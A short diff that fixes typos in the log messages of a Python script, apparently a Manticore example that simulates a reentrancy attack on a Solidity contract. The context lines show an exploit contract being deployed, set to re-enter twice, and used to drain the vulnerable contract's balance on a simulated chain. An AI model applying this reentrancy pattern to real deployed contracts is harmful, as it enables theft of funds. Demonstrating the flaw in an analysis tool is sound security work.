@@ -88,7 +88,7 @@ m.world.set_balance(contract_account, 1000000000000000000)  #give it some ether
 
 exploit_account = m.solidity_create_contract(exploit_source_code, owner=attacker_account)
 
-print("[+] Setup the exploit")
+print("[+] Set up the exploit")
 exploit_account.set_vulnerable_contract(contract_account)
 exploit_account.set_reentry_reps(2)
 
@@ -115,7 +115,7 @@ exploit_account.proxycall(ABI.function_selector('addToBalance()'), value=1000000
 print("[+] Let attacker extract all using exploit") 
 exploit_account.proxycall(ABI.function_selector('withdrawBalance()'))
 
-print("[+] Let attacker destroy the exploit andprofit") 
+print("[+] Let attacker destroy the exploit contract and profit") 
 exploit_account.get_money() 
 
 print(" attacker_account %x balance: %d"% (attacker_account.address, m.get_balance(attacker_account.address)))
